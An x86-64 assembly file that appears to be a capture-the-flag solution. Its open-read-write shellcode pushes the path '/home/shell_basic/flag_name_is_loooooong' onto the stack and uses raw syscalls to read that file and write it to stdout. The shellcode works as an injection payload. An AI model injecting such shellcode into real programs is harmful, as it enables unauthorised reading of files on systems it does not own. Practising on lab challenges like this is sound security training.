section .text
global _start

_start:  

; orw shell code
; int fd = open("/tmp/flag", 0, 0);
; rax = 0x02
; rdi = filename
; rsi = flags = 0
; rdi = filename
; rsi = flags = 0
; rdx = mode = 0 rdx = mode = 0

; Separate by 8 bytes
push 0x00
mov rax, 0x676E6F6F6F6F6F6F ; oooooong
push rax
mov rax, 0x6C5F73695F656D61 ; ame_is_l
push rax
mov rax, 0x6E5F67616C662F63 ; c/flag_n
push rax
mov rax, 0x697361625f6c6c65 ; ell_basi
push rax
mov rax, 0x68732f656d6f682f ; /home/sh
push rax


mov rdi, rsp    ; rdi = "/home/shell_basic/flag_name_is_loooooong"
xor rsi, rsi    ; flags = 0
xor rdx, rdx    ; mode = 0
mov rax, 0x02   ; syscall_open
syscall ; open



;read
; rax = 0x00
; rdi = fd
; rsi = buf
; rdx = count

mov rdi, rax    ; rdi = fd
mov rsi, rsp
sub rsi, 0x30 
mov rdx, 0x30 
mov rax, 0x00  
syscall

; write
; rax = 0x01
; rdi = fd
; rsi = buf
; rdx = count
mov rdi, 0x01
mov rax, 0x01    ; syscall_write
syscall
